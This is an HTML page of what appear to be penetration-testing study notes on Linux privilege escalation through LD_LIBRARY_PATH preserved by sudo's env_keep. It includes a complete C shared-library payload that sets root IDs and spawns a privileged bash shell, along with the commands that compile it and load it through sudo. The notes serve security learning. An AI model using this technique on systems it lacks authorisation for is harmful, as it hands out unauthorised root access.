<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LD_LIBRARY_PATH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>LD_LIBRARY_PATH</h1><br/><strong><h3>How it works LD_LIBRARY_PAT privilege escalation</h3></strong><br />• The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.<br />• The ldd command can be used to print the shared libraries used by a program:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ ldd &lt;program&gt;</pre></div><br />• By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.<br /><br /><br /><strong><h3>ACTION:</h3></strong><br />0. Check if <strong>env_keep</strong> option includes the <span style="color:#ff00e0;">LD_LIBRARY_PATH</span> environment variable<br />1. Run ldd against <span style="color:#ff8700;">any allowed program using sudo</span><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> -l</pre></div><br />    <a href=""><img src="images/1300-1.png" alt="images/1300-1.png" /></a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ ldd &lt;programBinary&gt;</pre></div><br />    <a href=""><img src="images/1300-2.png" alt="images/1300-2.png" /></a><br />    Hijacking shared objects using this method is hit or miss.<br />    We have to try each one from the list until we can find the one that work and become root(with point 4)<br />2. Create a file (library_path.c) with the following contents:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ vim library_path.c<br />    <span style="color:#0088ff;font-weight:400">#i --&gt; insert text</span><br />    <span style="color:#0088ff;font-weight:400">#Esc --&gt; to finish to insert the text</span><br />    <span style="color:#0088ff;font-weight:400">#:wq --&gt; write and quit</span></pre></div><br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdlib.h&gt;</span><br />static void <span style="color:#ffdd00;font-weight:400">hijack()</span> __attribute__<span style="color:#ff9d00;font-weight:700">((</span>constructor<span style="color:#ff9d00;font-weight:700">));</span><br />void <span style="color:#ffdd00;font-weight:400">hijack()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    unsetenv<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;LD_LIBRARY_PATH&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />    setresuid<span style="color:#ff9d00;font-weight:700">(</span>0,0,0<span style="color:#ff9d00;font-weight:700">);</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/bash -p&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />    It should spawn a shell when loaded<br />3. Compile library_path.c into the shared object file chosen (example: libcrypt.so.1)<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">gcc</span> -o libcrypt.so.1 -shared -fPIC library_path.c</pre></div><br />4. Run binary of the program using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c)<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> <span style="color:#7f0044;font-weight:400">LD_LIBRARY_PATH</span>=. &lt;programBinary&gt;</pre></div><br />    <a href=""><img src="images/1300-3.png" alt="images/1300-3.png" /></a><br /><br /><br /><br />Bibliography:<br /><a href="https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library">https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library</a><br /><br /><br /></div>
</body>
</html>
